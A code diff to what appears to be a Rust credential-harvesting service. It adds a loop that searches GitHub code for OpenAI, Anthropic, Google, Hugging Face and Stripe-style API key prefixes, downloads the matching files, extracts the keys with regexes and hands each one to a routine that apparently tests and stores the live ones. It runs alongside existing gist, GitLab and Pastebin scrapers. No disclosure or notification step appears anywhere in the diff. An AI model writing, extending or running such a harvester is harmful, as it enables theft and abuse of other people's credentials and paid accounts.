@@ -28,6 +28,10 @@ fn get_telegram_chat_id() -> String {
     env::var("TELEGRAM_CHAT_ID").unwrap_or_else(|_| "YOUR_CHAT_ID".to_string())
 }
 
+fn get_github_token() -> String {
+    env::var("GITHUB_TOKEN").unwrap_or_else(|_| "".to_string())
+}
+
 struct RegexPattern {
     provider: &'static str,
     pattern: Regex,
@@ -606,6 +610,160 @@ async fn pastebin_loop(state: Arc<AppState>) {
     }
 }
 
+// ----------------- GITHUB CODE SEARCH (THE #1 SOURCE — what unsecuredapikeys.com uses) -----------------
+async fn github_code_search_loop(state: Arc<AppState>) {
+    let gh_token = get_github_token();
+    if gh_token.is_empty() {
+        println!("[-] GitHub Code Search DISABLED — no GITHUB_TOKEN env var set");
+        return;
+    }
+    println!("[+] GitHub Code Search Engine ONLINE — authenticated with token");
+    println!("[*] This is the EXACT same source unsecuredapikeys.com uses!");
+    
+    let client = Client::builder()
+        .user_agent("Mozilla/5.0 (compatible; SecurityResearch/1.0)")
+        .timeout(Duration::from_secs(20))
+        .build().unwrap();
+    
+    let search_queries = vec![
+        "sk-proj-",
+        "sk-ant-api03-",
+        "AIzaSy",
+        "hf_",
+        "sk-live-",
+        "OPENAI_API_KEY sk-",
+        "ANTHROPIC_API_KEY sk-ant",
+        "\"api_key\" \"sk-proj\"",
+        "\"apiKey\" \"AIzaSy\"",
+        "openai.api_key",
+    ];
+    
+    let mut query_idx = 0;
+    let mut scan_count: u64 = 0;
+    let mut total_files_scanned: u64 = 0;
+    let mut total_keys_found: u64 = 0;
+    
+    loop {
+        scan_count += 1;
+        let query = search_queries[query_idx % search_queries.len()];
+        query_idx += 1;
+        
+        let search_url = format!(
+            "https://api.github.com/search/code?q={}&sort=indexed&order=desc&per_page=50",
+            query
+        );
+        
+        match client.get(&search_url)
+            .header("Authorization", format!("token {}", gh_token))
+            .header("Accept", "application/vnd.github.v3+json")
+            .send().await 
+        {
+            Ok(resp) => {
+                let status = resp.status().as_u16();
+                if status == 200 {
+                    if let Ok(data) = resp.json::<Value>().await {
+                        let total_count = data.get("total_count").and_then(|t| t.as_u64()).unwrap_or(0);
+                        
+                        if let Some(items) = data.get("items").and_then(|i| i.as_array()) {
+                            println!("[*] GitHub Search #{}: '{}' → {} total results, scanning {} items", 
+                                scan_count, query, total_count, items.len());
+                            
+                            for item in items.iter().take(20) {
+                                let repo = item.get("repository")
+                                    .and_then(|r| r.get("full_name"))
+                                    .and_then(|n| n.as_str())
+                                    .unwrap_or("unknown");
+                                let path = item.get("path")
+                                    .and_then(|p| p.as_str())
+                                    .unwrap_or("");
+                                
+                                // Fetch file content via the API URL
+                                if let Some(api_url) = item.get("url").and_then(|u| u.as_str()) {
+                                    total_files_scanned += 1;
+                                    
+                                    match client.get(api_url)
+                                        .header("Authorization", format!("token {}", gh_token))
+                                        .header("Accept", "application/vnd.github.v3+json")
+                                        .send().await 
+                                    {
+                                        Ok(file_resp) => {
+                                            if file_resp.status().is_success() {
+                                                if let Ok(file_data) = file_resp.json::<Value>().await {
+                                                    // Content is base64 encoded
+                                                    let content = if let Some(encoded) = file_data.get("content").and_then(|c| c.as_str()) {
+                                                        let clean = encoded.replace('\n', "").replace('\r', "");
+                                                        match base64_decode(&clean) {
+                                                            Some(decoded) => decoded,
+                                                            None => continue,
+                                                        }
+                                                    } else { continue };
+                                                    
+                                                    // Scan for API keys
+                                                    for pat in &state.patterns {
+                                                        for cap in pat.pattern.captures_iter(&content) {
+                                                            if let Some(m) = cap.get(1) {
+                                                                let key = m.as_str().to_string();
+                                                                total_keys_found += 1;
+                                                                println!("[!!!] GITHUB SEARCH CATCH: {} key in {}/{} => {}...", 
+                                                                    pat.provider, repo, path, &key[..key.len().min(30)]);
+                                                                tokio::spawn(test_and_store(key, pat.provider.to_string(), Arc::clone(&state)));
+                                                            }
+                                                        }
+                                                    }
+                                                }
+                                            }
+                                        },
+                                        Err(_) => {},
+                                    }
+                                }
+                            }
+                            
+                            println!("[~] GitHub Search Stats: {} files scanned, {} keys extracted total", total_files_scanned, total_keys_found);
+                        }
+                    }
+                } else if status == 403 || status == 429 {
+                    println!("[-] GitHub Search rate limited ({}). Sleeping 60s...", status);
+                    tokio::time::sleep(Duration::from_secs(60)).await;
+                    continue;
+                } else if status == 422 {
+                    println!("[-] GitHub Search query validation error for '{}'. Skipping.", query);
+                } else {
+                    println!("[-] GitHub Search HTTP {} for query '{}'", status, query);
+                }
+            },
+            Err(e) => println!("[-] GitHub Search connection error: {}", e),
+        }
+        
+        // Rate limit: 10 search requests per minute (authenticated), so wait 12s between calls
+        tokio::time::sleep(Duration::from_secs(12)).await;
+    }
+}
+
+// Simple base64 decoder (no external crate needed)
+fn base64_decode(input: &str) -> Option<String> {
+    let table = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    let mut output = Vec::new();
+    let mut buf: u32 = 0;
+    let mut bits: u32 = 0;
+    
+    for &byte in input.as_bytes() {
+        if byte == b'=' || byte == b' ' { continue; }
+        let val = match table.iter().position(|&b| b == byte) {
+            Some(v) => v as u32,
+            None => continue,
+        };
+        buf = (buf << 6) | val;
+        bits += 6;
+        if bits >= 8 {
+            bits -= 8;
+            output.push((buf >> bits) as u8);
+            buf &= (1 << bits) - 1;
+        }
+    }
+    
+    String::from_utf8(output).ok()
+}
+
 // ----------------- AXUM WEB SERVER -----------------
 #[derive(Serialize)]
 struct StatsRecord { total: i64, living: i64 }
@@ -725,6 +883,7 @@ async fn main() {
     tokio::spawn(gists_loop(Arc::clone(&state)));
     tokio::spawn(gitlab_loop(Arc::clone(&state)));
     tokio::spawn(pastebin_loop(Arc::clone(&state)));
+    tokio::spawn(github_code_search_loop(Arc::clone(&state)));
 
     let app = Router::new()
         .fallback_service(ServeDir::new("public"))
